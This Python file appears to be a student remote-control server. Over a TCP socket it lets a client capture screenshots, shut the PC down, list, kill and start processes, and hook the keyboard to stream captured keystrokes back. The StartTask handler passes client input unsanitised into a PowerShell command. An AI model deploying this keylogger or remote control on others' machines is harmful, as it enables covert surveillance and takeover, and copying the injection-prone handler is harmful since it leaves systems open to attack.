
from threading import Thread
import pyautogui
import socket
import os
import signal
import pynput
from pynput.keyboard import Key, Listener, Controller


#
def Keystroke(Client):
    Keyboards = Controller()
    Stop = True
    ListKeys = []

    def StopHook():
        nonlocal Stop
        while True:
            if Stop == True:
                try:
                    while True:
                        checkdata = Client.recv(1024).decode("utf-8")
                        if checkdata == "UnhookKey":
                            print(Stop)
                            Stop = False
                            break
                finally:
                    Keyboards.release(Key.space)
            break

    def KeyLogger():
        while True:
            def Pressing(logger):  # Nhận phím
                nonlocal ListKeys
                ListKeys.append(logger)

            def Releasing(logger):
                print(Stop)  # Điều kiện ngừng vòng lặp
                if Stop == False: listener.stop()

            with Listener(on_release=Releasing, on_press=Pressing) as listener:
                listener.join()

            def Writing(ListKeys):
                global count
                logging = ''
                count = 0
                for logger in ListKeys:
                    temp = str(logger).replace("'", "")

                    if (str(temp) == "Key.space"):
                        temp = " "
                    elif (str(temp) == "Key.backspace"):
                        temp = "Backspace"
                    elif (str(temp) == "Key.shift"):
                        temp = ""

                    temp = str(temp).replace("Key.", '')
                    temp = str(temp).replace("Key.cmd", "")

                    if (str(temp) == "<96>"):
                        temp = "0"
                    elif (str(temp) == "<97>"):
                        temp = "1"
                    elif (str(temp) == "<98>"):
                        temp = "2"
                    elif (str(temp) == "<99>"):
                        temp = "3"
                    elif (str(temp) == "<100>"):
                        temp = "4"
                    elif (str(temp) == "<101"):
                        temp = "5"
                    elif (str(temp) == "<102>"):
                        temp = "6"
                    elif (str(temp) == "<103>"):
                        temp = "7"
                    elif (str(temp) == "<104>"):
                        temp = "8"
                    elif (str(temp) == "<105>"):
                        temp = "9"

                    temp = str(temp).replace("<home>", "Home")
                    temp = str(temp).replace("<esc>", "ESC")
                    temp = str(temp).replace("<tab>", "")
                    temp = str(temp).replace("<cmd>", "fn")
                    temp = str(temp).replace("<enter>", "Enter")
                    temp = str(temp).replace("<caps_lock>", "")
                    temp = str(temp).replace("<shift_l>", "")
                    temp = str(temp).replace("<shift_r>", "")
                    temp = str(temp).replace("<ctrl_l>", "")
                    temp = str(temp).replace("<num_lock>", "")
                    temp = str(temp).replace("<ctrl_r>", "")
                    temp = str(temp).replace("<alt_l>", "")
                    temp = str(temp).replace("<alt_gr>", "")
                    temp = str(temp).replace("<delete>", "Del")
                    temp = str(temp).replace("<print_screen>", "PrtSc")

                    temp = str(temp).replace("home", "Home")
                    temp = str(temp).replace("esc", "ESC")
                    temp = str(temp).replace("tab", "")
                    temp = str(temp).replace("cmd", "fn")
                    temp = str(temp).replace("enter", "Enter")
                    temp = str(temp).replace("caps_lock", "")
                    temp = str(temp).replace("shift_l", "")
                    temp = str(temp).replace("shift_r", "")
                    temp = str(temp).replace("ctrl_l", "")
                    temp = str(temp).replace("num_lock", "")
                    temp = str(temp).replace("ctrl_r", "")
                    temp = str(temp).replace("alt_l", "")
                    temp = str(temp).replace("alt_gr", "")
                    temp = str(temp).replace("delete", "Del")
                    temp = str(temp).replace("print_screen", "PrtSc")

                    logging += temp
                    count += 1
                    print(logging)
                return logging[0:]

            data = Writing(ListKeys)
            if data == "": data = " "
            print(data)
            Client.sendall(bytes(data, "utf-8"))
            checkdata = Client.recv(1024).decode("utf-8")
            ListKeys.clear()
            break

    threadingLogger = Thread(target=KeyLogger)
    threadingStop = Thread(target=StopHook)
    threadingStop.start()
    threadingLogger.start()
    threadingLogger.join()


# Receive request from client
def readRequest(Client):
    request = ""
    try:
        request = Client.recv(1024).decode('utf-8')
    finally:
        return request


# Choose option from request
def takeRequest(Client, SERVER):
    while True:
        Request = readRequest(Client)
        print(Request)
        if not Request:
            Client.close()
            break
        print("Request from client: \n")

        if "TakePicture" == Request:
            image = pyautogui.screenshot()

            image.save("scrshot.png")
            try:

                myfile = open('scrshot.png', 'rb')
                bytess = myfile.read()

                Client.sendall(bytess)
                myfile.close()
            except:
                print("Can't capture screenshots")

        elif "Shutdown" == Request:
            print("test")
            os.system("shutdown /s /t 30")
            Client.send(bytes("Da tat may", "utf-8"))
            print("ShutDown")

        elif "ProcessRunning" == Request:
            import subprocess
            cmd = 'powershell "Get-Process |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
            ProccessProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
            count = 0
            length = 0
            Name = ['' for i in range(100000)]
            ID = ['' for i in range(100000)]
            Thread = ['' for i in range(100000)]
            for line in ProccessProc.stdout:
                if line.rstrip():
                    if count < 2:
                        count += 1
                        continue
                    msg = str(line.decode().rstrip().lstrip())
                    msg = " ".join(msg.split())
                    lists = msg.split(" ", 3)
                    ID[length] = lists[0]
                    Name[length] = lists[1]
                    Thread[length] = lists[2]
                    length += 1

            Client.sendall(bytes(str(length), "utf-8"))

            for i in range(length):
                Client.sendall(bytes(ID[i], "utf-8"))
                checkdata = Client.recv(1024)
            for i in range(length):
                Client.sendall(bytes(Name[i], "utf-8"))
                checkdata = Client.recv(1024)
            for i in range(length):
                Client.sendall(bytes(Thread[i], "utf-8"))
                checkdata = Client.recv(1024)
            print("ProcessRunning")
        elif "AppRunning" == Request:
            print("AppRunning")
            import subprocess
            cmd = 'powershell "Get-Process |where {$_.mainWindowTItle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
            appProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
            count = 0
            length = 0
            Name = ['' for i in range(100)]
            ID = ['' for i in range(100)]
            Thread = ['' for i in range(100)]
            for line in appProc.stdout:
                if line.rstrip():
                    if count < 2:
                        count += 1
                        continue
                    msg = str(line.decode().rstrip().lstrip())
                    msg = " ".join(msg.split())
                    lists = msg.split(" ", 3)
                    ID[length] = lists[0]
                    Name[length] = lists[1]
                    Thread[length] = lists[2]
                    length += 1

            Client.sendall(bytes(str(length), "utf-8"))

            for i in range(length):
                Client.sendall(bytes(ID[i], "utf-8"))
                checkdata = Client.recv(1024)
            for i in range(length):
                Client.sendall(bytes(Name[i], "utf-8"))
                checkdata = Client.recv(1024)
            for i in range(length):
                Client.sendall(bytes(Thread[i], "utf-8"))
                checkdata = Client.recv(1024)
        elif "KillTask" == Request:  # Xóa
            print("KillTask")
            m = Client.recv(1024)
            pid = int(m)
            print(str(pid))
            os.kill(pid, signal.SIGTERM)

            Client.send(bytes("Killed", "utf-8"))

        elif "StartTask" == Request:  # Mở app
            print("StartTask")
            import subprocess
            mode = 0o666
            flags = os.O_RDWR | os.O_CREAT
            m = Client.recv(1024)
            msg = str(m)
            msg = msg[2:]
            msg = msg[:len(msg) - 1]
            print(str(msg))
            print("C:/Windows/System32/" + msg + ".exe")
            cmd = 'powershell start ' + msg
            subprocess.call(cmd)
            Client.send(bytes("Started", "utf-8"))

        elif "HookKey" == Request:
            print("KeyStroke")
            Client.sendall(bytes("Đã nhận", "utf-8"))
            Keystroke(Client)

        elif "Close" == Request:
            SERVER.close()
            print("Close")


#
def Serveur(SERVER):
    try:
        SERVER.listen()
        ACCEPT_THREAD = Thread(target=waitingConnection(SERVER))
        ACCEPT_THREAD.start()
        ACCEPT_THREAD.join()
    except:
        print("ERROR!")
    finally:
        SERVER.close()


# wait to connect for client
def waitingConnection(SERVER):
    print("Waiting for Client")

    while True:
        client, Address = SERVER.accept()
        print("Client", Address, "connected!")
        Thread(target=takeRequest, args=(client,SERVER)).start()

def setUpServer():
    print("Server IP Address Now ", (socket.gethostbyname(socket.gethostname())))
    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SERVER.bind((socket.gethostbyname(socket.gethostname()), 5656))
    Serveur(SERVER)